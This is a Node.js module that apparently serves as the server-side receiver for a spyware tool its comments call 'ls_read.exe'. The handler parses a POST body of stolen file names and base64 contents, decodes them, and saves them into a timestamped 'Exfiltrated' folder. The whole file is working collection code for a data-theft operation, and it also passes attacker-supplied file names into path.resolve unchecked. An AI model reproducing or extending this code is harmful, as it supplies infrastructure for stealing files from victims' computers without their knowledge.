const fs = require("fs");
const path = require("path");
const { getTimestamp, getFileExtension, textExtensions } = require("../util.js");
const logging = require("../logging.js");

/**
 * The POST function for ls_read.exe spyware.
 * This takes in the request JSON and "downloads the file" in ../Exfiltrated/
 */
module.exports = function(request) 
{
    logging.log("Executing ls_read POST function");

    // Let's first declare the directory path we want to write to. If it does not exist, create said path.
    // Originally, I thought fs.mkdirSync with recursive:true would do it. However, I'm getting stupid ENOENT errors that the internet has no solutions for.
    // My theory is that recursive:true starts off at the root directory and attempts to modify that (which, of course it can't since we didn't grant it permission to do that)
    // Hence, it errors
    const dir_path = path.join(`./Exfiltrated`, `${getTimestamp()} ls_read/`).replace(/\:/gmi, "-");
    fs.mkdirSync(dir_path, {
        recursive: true
    });

    /**
     * @type {JSON}
     */
    let reqJSON = JSON.parse(request.body);
    
    // Loop through all file names and contents returned in the ls_read JSON. Then, it writes the file inside dir_path
    Object.entries(reqJSON).forEach((jsonEntry) => {
        const [fileName, fileBase64] = jsonEntry;
        let filePath = path.resolve(dir_path, fileName);
        
        // Classify the documents we get into text ones or binary ones. Most of the time, we'll be writing the bytes directly.
        // If that doesn't go right, we'll UTF-8 this.

        var fileExtension = getFileExtension(fileName).toLowerCase();
        if (textExtensions.indexOf(fileExtension) != -1)
        {
            // If it is a text file
            // These files are in base64. In JS, you need to convert the base64 into a binary buffer, and then re-encode it in UTF-8
            let fileContent = Buffer.from(fileBase64, 'base64').toString("utf-8");
            fs.writeFileSync(filePath, fileContent, {encoding: "utf-8"});
        }
        else
        {
            // If there's binary
            let fileContent = Buffer.from(fileBase64, 'base64');
            fs.writeFileSync(filePath, fileContent, {encoding: "binary"});
        }

        logging.log(`Copied file ${fileName} into ${filePath}.`);
    });
}